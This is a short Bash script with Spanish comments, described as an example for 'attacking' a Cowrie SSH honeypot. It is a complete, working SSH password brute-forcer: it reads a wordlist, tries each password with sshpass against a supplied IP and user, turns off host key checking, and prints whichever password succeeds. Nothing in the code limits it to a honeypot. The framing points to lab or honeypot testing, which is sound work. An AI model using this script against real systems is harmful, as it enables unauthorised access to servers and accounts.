#!/bin/bash
# Script de ejemplo para "atacar" un honeypot Cowrie vía SSH
# Uso: ./ssh-bruteforce.sh <IP_HONEYPOT> <USUARIO> <diccionario_passwords.txt>
# Ejemplo: ./ssh-bruteforce.sh 1.2.3.4 root passwords.txt


if [ $# -ne 3 ]; then
  echo "Uso: $0 <IP_HONEYPOT> <USUARIO> <diccionario_passwords.txt>"
  echo "Ejemplo: $0 1.2.3.4 root passwords.txt"
  exit 1
fi

IP="$1"
USER="$2"
WORDLIST="$3"

while read -r PASS; do
  echo "Probando password: $PASS"
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USER@$IP" exit
  if [ $? -eq 0 ]; then
    echo "[+] Contraseña encontrada: $PASS"
    exit 0
  fi
done < "$WORDLIST"

echo "[-] Ninguna contraseña del diccionario funcionó."
